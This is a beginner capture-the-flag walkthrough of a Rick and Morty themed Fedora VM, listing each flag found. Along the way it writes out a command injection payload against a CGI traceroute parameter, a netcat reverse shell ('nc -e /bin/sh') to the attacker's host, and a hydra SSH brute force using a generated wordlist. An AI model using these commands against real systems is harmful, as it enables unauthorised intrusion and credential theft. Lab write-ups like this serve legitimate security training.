#introduction

This is a fedora server vm, created with virtualbox.
It is a very simple Rick and Morty themed boot to root.
There are 130 points worth of flags available (each flag has its points recorded with it), you should also get root.
It's designed to be a beginner ctf, if you're new to pen testing (and a fan of Rick And Morty), check it out!

#footprinting
*** Address
The IP address can be found by many methods, hand made scripts or simply netdiscover:
  netdiscover -r 192.168.1.1/24
  192.168.1.12

*** preliminary finding
**9090
First flag is on the port 9090. There's an admin console... 
---FLAG {There is no Zeus, in your face!} - 10 points.
The form does not work, I tried bypassing the form with burp but POST and PUT methods are not allowed.

**80
The website has nothing on it.. What did I expect from a Morty :-| .. But there are some robots and "it's OK to shoot them!" :
/robots.txt
They're Robots Morty! It's ok to shoot them! They're just Robots!
/cgi-bin/root_shell.cgi --> under-construction and there is nothing on it
/cgi-bin/tracertool.cgi --> execute a traceroute with the parameter IP (possible command injection)
/cgi-bin/* --> forbidden

** Nikto
A quick nikto scan gave us some cool results (check nikto-scan.out). There's an accessible directory named passwords 
wich has a flag: 
---FLAG{Yeah d- just don't do it.} - 10 Points
Aaaaand a password in the page source of  password.html -> "winter"... Real clever Morty.

** Dirb
A dirb directory list brute forcing is needed to be sure we didnt miss anything else... Aaand there is nothing else.

#scanning
*** Nmap
A quick TCP port scan on the top ports:
nmap -Pn -sS -n --reason -A --top-ports 10000 -oA rickdiculous 192.168.1.12
21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh?    syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    syn-ack ttl 64 Cockpit web service
13337/tcp open unknown  syn-ack ttl 64
22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown syn-ack ttl 64

#system hacking
*** FTP
Let's start with the easy stuff. We have an FTP server that allows anonymous ftp login. Let's check what's behind it:
We got a flag:
---FLAG{Whoa this is unexpected} - 10 Points
and a pub directory with nothing in it.

*** port 22 *
On port 22 the connection seems to be closed. I used this command to see more details: ssh -vvv root@192.168.1.12
Apparently we need a key to establish connection.

*** port 60000 *
Using nc, we get a "half baked reverse shell" and get a flag:
---FLAG{Flip the pickle Morty!} - 10 Points
Is this a hint? If so, I'm guessing the service behind this port uses python pickle ? We'll check this out later...

*** port 80 (again) *
Let's get back to the traceroute command located on /cgi-bin/tracertool.cgi

So we can inject some code using | on the parameter ip:
My first try was ?ip=127.0.0.1 | cat /etc/passwd and I got this nice cat:
                         _
                        | \
                        | |
                        | |
   |\                   | |
  /, ~\                / /
 X     `-.....-------./ /
  ~-. ~  ~              |
     \             /    |
      \  /_     ___\   /
      | /\ ~~~~~   \  |
      | | \        || |
      | |\ \       || )
     (_/ (_/      ((_/


The command is than aliased to another command. The command grep '[a-zA-Z0-9]' /etc/passwd
still can be used
I injected this command nc -e /bin/sh 192.168.1.13 4444 so I can get a shell with netcat.
But nothing seems usefull.

*** port 13337
nc 192.168.1.12 13337 gave us an easy flag with no hints
---FLAG:{TheyFoundMyBackDoorMorty}-10Points

*** port 22222
The port 22222 is running an openssh service. We had the password winter earlier, i trieded 
with different user and it worked on Summer.
Morty's home is accessible and got to files : 
   - journal.txt.zip: password protected zip.
   - Safe_Password.jpg: a picture of rick. I used steghide to find some hiden data but couldnt find any.
	Using strings we got lucky : Safe password is Meeseek
We got a flag from Morty's journal (and maybe a password):
---FLAG: {131333} - 20 Points

Morty's journal is talking about a safe. In Rick's home directory was a safe folder and an executable.
Summer hasnt executable rights so I copied it in tmp to try and execute it and it worked.
The executable need arguments. We used the flag 131333 and we got a flag and sme hints:
---FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
The hints to guess Rick's password is :
1 uppercase character
1 digit
One of the words in my old bands name.ï¿½	@

Rick told me to make a script so I made a script:
"
import string
for i in string.ascii_uppercase:
        for x in range(10):
                        print(i+str(x)+"Flesh")
                        print(i+str(x)+"Curtains")
"
I generated a wordlist file using python script.py | tee rickpasswords.txt
and I used hydra to (list-based) bruteforce the ssh port:
hydra -s 22222 -l RickSanchez -P rickpasswords.txt 192.168.1.12 -t 4 ssh
And the password for Rick's shell is: P7Curtains
RickSanchez is a superuser so we can read the last flag in the root's directory:
---FLAG: {Ionic Defibrillator} - 30 points
